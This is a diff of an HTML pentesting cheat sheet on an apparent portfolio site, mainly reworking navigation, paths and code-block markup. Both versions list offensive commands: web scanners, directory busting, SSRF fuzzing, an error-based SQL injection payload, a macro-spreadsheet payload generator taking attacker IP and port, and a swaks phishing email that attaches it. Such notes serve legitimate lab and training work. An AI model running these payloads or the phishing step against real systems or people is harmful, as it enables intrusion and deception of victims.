@@ -5,24 +5,25 @@
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <meta name="description" content="Web app and fuzzing cheat sheet" />
   <title>Web App Cheat Sheet</title>
-  <link rel="stylesheet" href="/assets/css/writeups.css">
-  <nav class="cheatsheet-navbar">
-  <div class="nav-left">
-    <a href="index.html" class="nav-logo">Portfolio</a>
-  </div>
-  <ul class="nav-right">
-    <li><a href="../writeups/">Writeups</a></li>
-    <li><a href="cheatsheet.html" class="active">Cheatsheets</a></li>
-  </ul>
-</nav>
+  <link rel="stylesheet" href="../assets/css/writeups.css">
 </head>
 <body>
+  <nav class="cheatsheet-navbar">
+    <div class="nav-left">
+      <a href="../index.html" class="nav-logo">Portfolio</a>
+    </div>
+    <ul class="nav-right">
+      <li><a href="../writeups/">Writeups</a></li>
+      <li><a href="cheatsheet.html" class="active">Cheatsheets</a></li>
+    </ul>
+  </nav>
+
   <header class="site-header">
     <div class="wrap">
       <h1>Web App / Fuzzing / Phishing</h1>
       <nav class="main-nav">
         <ul>
-          <li><a href="index.html">Home</a></li>
+          <li><a href="../index.html">Home</a></li>
           <li><a href="recon.html">Recon</a></li>
           <li><a href="windows.html">Windows</a></li>
           <li><a href="web.html" class="active">Web</a></li>
@@ -32,81 +33,42 @@
     </div>
   </header>
 
-  <main class="wrap">
+  <main class="cheatsheet-content cheatsheet">
     <article>
       <h2>WhatWeb / Nikto / WPScan</h2>
-      <div class="code">
-        <button class="copy-btn" data-target="web1">Copy</button>
-        <pre><code id="web1">whatweb http://target</code></pre>
-      </div>
-
-      <div class="code">
-        <button class="copy-btn" data-target="web2">Copy</button>
-        <pre><code id="web2">nikto -h http://target</code></pre>
-      </div>
-
-      <div class="code">
-        <button class="copy-btn" data-target="web3">Copy</button>
-        <pre><code id="web3">wpscan --url http://target --enumerate p --plugins-detection aggressive -o wpscan</code></pre>
-      </div>
+      <pre><code>whatweb http://target</code></pre>
+      <pre><code>nikto -h http://target</code></pre>
+      <pre><code>wpscan --url http://target --enumerate p --plugins-detection aggressive -o wpscan</code></pre>
 
       <h2>Directory busting</h2>
-      <div class="code">
-        <button class="copy-btn" data-target="web4">Copy</button>
-        <pre><code id="web4">gobuster dir -u http://site -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 42 -b 400,403,404</code></pre>
-      </div>
-
-      <div class="code">
-        <button class="copy-btn" data-target="web5">Copy</button>
-        <pre><code id="web5">feroxbuster -u http://site -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
-      </div>
+      <pre><code>gobuster dir -u http://site -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 42 -b 400,403,404</code></pre>
+      <pre><code>feroxbuster -u http://site -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
 
       <h2>Fuzzing & SSRF</h2>
-      <div class="code">
-        <button class="copy-btn" data-target="web6">Copy</button>
-        <pre><code id="web6">ffuf -u http://linkvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.linkvortex.htb'</code></pre>
-      </div>
-
-      <div class="code">
-        <button class="copy-btn" data-target="web7">Copy</button>
-        <pre><code id="web7">ffuf -request ssrf.req -request-proto http -w &lt;(seq 1 65535) -fs 61</code></pre>
-      </div>
+      <pre><code>ffuf -u http://linkvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.linkvortex.htb'</code></pre>
+      <pre><code>ffuf -request ssrf.req -request-proto http -w &lt;(seq 1 65535) -fs 61</code></pre>
 
       <h2>SQLi (error-based example)</h2>
-      <div class="code">
-        <button class="copy-btn" data-target="web8">Copy</button>
-        <pre><code id="web8">1 AND EXTRACTVALUE(1,concat(0x0a, (select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA)))</code></pre>
-      </div>
+      <pre><code>1 AND EXTRACTVALUE(1,concat(0x0a, (select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA)))</code></pre>
 
       <h2>Payload / Macro Generator</h2>
-      <p>Malicious LibreOffice / ODS generator (MMG-LO) example payload:</p>
-      <div class="code">
-        <button class="copy-btn" data-target="web9">Copy</button>
-        <pre><code id="web9">python3 mmg-ods.py windows &lt;ATTACKER IP&gt; &lt;ATTACKER PORT&gt;</code></pre>
-      </div>
+      <pre><code>python3 mmg-ods.py windows &lt;ATTACKER IP&gt; &lt;ATTACKER PORT&gt;</code></pre>
 
       <h2>Phishing - swaks</h2>
-      <div class="code">
-        <button class="copy-btn" data-target="web10">Copy</button>
-        <pre><code id="web10">sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.236.140 --body "Please check this spreadsheet" --header "Subject: Please check this spreadsheet"</code></pre>
-      </div>
+      <pre><code>sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.236.140 --body "Please check this spreadsheet" --header "Subject: Please check this spreadsheet"</code></pre>
 
       <h2>WebDAV quick connect</h2>
-      <div class="code">
-        <button class="copy-btn" data-target="web11">Copy</button>
-        <pre><code id="web11">cadaver &lt;webdav_url&gt;</code></pre>
-      </div>
-
+      <pre><code>cadaver &lt;webdav_url&gt;</code></pre>
     </article>
   </main>
 
   <footer class="site-footer">
     <div class="wrap">
       <p>© Rachel Murphy 2025</p>
-      <p><a href="index.html">Back</a></p>
+      <p><a href="../index.html">Back</a></p>
     </div>
   </footer>
 
-  <script src="/assets/css/js/script.js"></script>
+  <script src="../assets/css/js/script.js"></script>
 </body>
 </html>
